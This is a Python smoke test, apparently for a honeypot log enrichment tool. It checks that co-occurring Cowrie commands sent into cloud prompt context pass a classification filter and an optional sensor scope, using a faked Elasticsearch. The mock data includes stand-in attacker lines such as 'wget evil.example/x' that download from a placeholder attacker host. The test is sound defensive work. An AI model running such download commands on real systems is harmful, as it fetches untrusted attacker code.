"""Co-occurrence cloud-context privacy gate (release-readiness P0-1 / P1-1).

`fetch_cooccurring_commands()` pulls sibling command lines from raw Cowrie
events and feeds them straight into cloud prompt context
(`cooccurring_block`). It used to run those ES queries with no classification
filter at all — a public anchor command could carry co-occurring command text
from confidential or untagged sessions into the cloud call. It's now bounded
by `releasable_filter(cfg)` on every query, plus an optional `observer.name`
scope when the caller knows a single sensor produced the anchor command.

That sensor value comes from `iter_command_events()`'s `_source` projection,
which also had to start fetching `dshield.classification` (release-readiness
P1-1) — without it, every freshly-built command group's classification was
silently `None` regardless of the real per-event tag, because the aggregation
code was reading a field that was never in the response.

Standalone — no real ES. Verifies, offline:
  [1] `iter_command_events`'s `_source` request includes both new fields.
  [2] every `fetch_cooccurring_commands` query carries `releasable_filter(cfg)`
      in `bool.filter`.
  [3] a known single sensor adds an `observer.name` term filter; an unknown/
      multi-sensor command does not (falls back to classification-only gating).
  [4] `_single_sensor` collapses a command's contributing-sensor set correctly.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke/smoke_test_cooccurrence_privacy_gate.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from enrich.classification import releasable_filter
from enrich.sources.cowrie.commands import (
    _single_sensor,
    fetch_cooccurring_commands,
    iter_command_events,
)

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


class _Cfg:
    """Tiny cfg shim carrying just the classification knob (mirrors
    smoke_test_classification.py's shim)."""
    def __init__(self, unclassified_is_confidential=True):
        self.classification = type(
            "C", (), {"unclassified_is_confidential": unclassified_is_confidential})()


CFG = _Cfg()


# -----------------------------------------------------------------------------
# [1] iter_command_events fetches classification + sensor.
# -----------------------------------------------------------------------------
print("\n[1] iter_command_events requests dshield.classification + observer.name")


class _FakeESSourceCapture:
    def __init__(self):
        self.bodies: list[dict] = []

    def search(self, index=None, **body):
        self.bodies.append(body)
        return {"hits": {"hits": []}}


es1 = _FakeESSourceCapture()
list(iter_command_events(es1, "events-idx", since=None))
check("search called", len(es1.bodies) == 1)
source_fields = es1.bodies[0]["_source"]
check("dshield.classification requested", "dshield.classification" in source_fields, str(source_fields))
check("observer.name requested", "observer.name" in source_fields, str(source_fields))


# -----------------------------------------------------------------------------
# Fake ES for fetch_cooccurring_commands: enough hits to pass min_sessions and
# reach every query stage, capturing every query body issued.
# -----------------------------------------------------------------------------
class _FakeESQueryCapture:
    def __init__(self):
        self.queries: list[dict] = []

    def search(self, index=None, size=None, query=None, aggs=None, **kw):
        self.queries.append(query)
        if aggs and "sessions" in aggs:
            return {"aggregations": {"sessions": {"buckets": [
                {"key": "sess-1"}, {"key": "sess-2"},
            ]}}}
        if aggs and "siblings" in aggs:
            return {"aggregations": {"siblings": {"buckets": [
                {"key": "wget evil.example/x", "sessions": {"value": 2}},
            ]}}}
        if aggs and "by_cmd" in aggs:
            return {"aggregations": {"by_cmd": {"buckets": [
                {"key": "wget evil.example/x", "sessions": {"value": 2}},
            ]}}}
        return {"aggregations": {}}


def _filters(query: dict) -> list:
    return (query.get("bool") or {}).get("filter") or []


# -----------------------------------------------------------------------------
# [2] Every query carries releasable_filter(cfg).
# -----------------------------------------------------------------------------
print("\n[2] every ES query is bounded by releasable_filter(cfg)")
es2 = _FakeESQueryCapture()
out2 = fetch_cooccurring_commands(
    es2, "events-idx", "wget evil.example/anchor",
    cfg=CFG, session_sample_size=5, top_k=8, min_sessions=1, total_sessions=100,
)
check("3 queries issued", len(es2.queries) == 3, f"got {len(es2.queries)}")
public_filter = releasable_filter(CFG)
for i, q in enumerate(es2.queries):
    check(f"query {i} bool.filter contains releasable_filter(cfg)",
          public_filter in _filters(q), f"query={q}")
check("siblings returned", out2 == [("wget evil.example/x", 2)], f"got {out2!r}")


# -----------------------------------------------------------------------------
# [3] Known single sensor adds an observer.name term filter; no sensor does not.
# -----------------------------------------------------------------------------
print("\n[3] sensor scoping: added when known, absent when unknown")
es3 = _FakeESQueryCapture()
fetch_cooccurring_commands(
    es3, "events-idx", "wget evil.example/anchor",
    cfg=CFG, session_sample_size=5, top_k=8, min_sessions=1, total_sessions=100,
    sensor="sensor-a",
)
sensor_term = {"term": {"observer.name": "sensor-a"}}
check("session-lookup query scoped by sensor", sensor_term in _filters(es3.queries[0]), str(es3.queries[0]))
check("sibling-agg query scoped by sensor", sensor_term in _filters(es3.queries[1]), str(es3.queries[1]))
check("corpus-df query NOT sensor-scoped (global IDF denominator)",
      sensor_term not in _filters(es3.queries[2]), str(es3.queries[2]))

es4 = _FakeESQueryCapture()
fetch_cooccurring_commands(
    es4, "events-idx", "wget evil.example/anchor",
    cfg=CFG, session_sample_size=5, top_k=8, min_sessions=1, total_sessions=100,
    sensor=None,
)
check("no sensor filter when sensor is None",
      all(sensor_term not in _filters(q) for q in es4.queries), str(es4.queries))


# -----------------------------------------------------------------------------
# [4] _single_sensor collapses a command's contributing-sensor set.
# -----------------------------------------------------------------------------
print("\n[4] _single_sensor")
check("one named sensor -> that sensor", _single_sensor({"sensor-a"}) == "sensor-a")
check("two named sensors -> None (ambiguous)", _single_sensor({"sensor-a", "sensor-b"}) is None)
check("only None -> None", _single_sensor({None}) is None)
check("named + None -> the named one", _single_sensor({"sensor-a", None}) == "sensor-a")
check("empty set -> None", _single_sensor(set()) is None)


# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
